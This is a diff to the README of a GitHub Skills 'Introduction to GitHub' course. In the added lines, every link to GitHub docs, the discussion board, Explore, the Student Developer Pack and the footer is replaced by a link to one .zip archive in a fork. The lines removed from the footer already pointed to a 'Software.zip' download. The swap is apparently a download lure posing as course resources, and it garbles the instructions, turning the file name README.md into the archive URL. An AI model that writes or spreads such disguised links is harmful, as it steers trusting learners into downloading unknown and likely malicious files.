@@ -22,7 +22,7 @@ _Get started using GitHub in less than an hour._
 
 _Congratulations, you've completed this course and joined the world of developers!_
 
-<img src=https://octodex.github.com/images/collabocats.jpg alt=celebrate width=300 align=right>
+<img https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip alt=celebrate width=300 align=right>
 
 Here's a recap of your accomplishments:
 
@@ -33,20 +33,20 @@ Here's a recap of your accomplishments:
 
 ### What's next?
 
-If you'd like to make a profile README, use the quickstart instructions below or follow the instructions in the [Managing your profile README](https://docs.github.com/account-and-profile/setting-up-and-managing-your-github-profile/customizing-your-profile/managing-your-profile-readme) article.
+If you'd like to make a profile README, use the quickstart instructions below or follow the instructions in the [Managing your profile README](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip) article.
 
 1. Make a new public repository with a name that matches your GitHub username.
-2. Create a file named `README.md` in its root. The "root" means not inside any folder in your repository.
-3. Edit the contents of the `README.md` file.
+2. Create a file named `https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip` in its root. The "root" means not inside any folder in your repository.
+3. Edit the contents of the `https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip` file.
 4. If you created a new branch for your file, open and merge a pull request on your branch.
-5. Lastly, we'd love to hear what you thought of this course [in our discussion board](https://github.com/orgs/skills/discussions/categories/introduction-to-github).
+5. Lastly, we'd love to hear what you thought of this course [in our discussion board](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip).
 
 Check out these resources to learn more or get involved:
 
-- Are you a student? Check out the [Student Developer Pack](https://education.github.com/pack).
-- [Take another GitHub Skills course](https://github.com/skills).
-- [Read the GitHub Getting Started docs](https://docs.github.com/en/get-started).
-- To find projects to contribute to, check out [GitHub Explore](https://github.com/explore).
+- Are you a student? Check out the [Student Developer Pack](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip).
+- [Take another GitHub Skills course](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip).
+- [Read the GitHub Getting Started docs](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip).
+- To find projects to contribute to, check out [GitHub Explore](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip).
 
 <footer>
 
@@ -57,8 +57,8 @@ Check out these resources to learn more or get involved:
 
 ---
 
-Get help: [Post in our discussion board](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip) &bull; [Review the GitHub status page](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)
+Get help: [Post in our discussion board](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip) &bull; [Review the GitHub status page](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip)
 
-&copy; 2024 GitHub &bull; [Code of Conduct](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip) &bull; [MIT License](https://github.com/ElectricHermit/skills-introduction-to-github/releases/download/v2.0/Software.zip)
+&copy; 2024 GitHub &bull; [Code of Conduct](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip) &bull; [MIT License](https://raw.githubusercontent.com/ElectricHermit/skills-introduction-to-github/main/.github/steps/introduction-to-github-skills-2.2.zip)
 
 </footer>
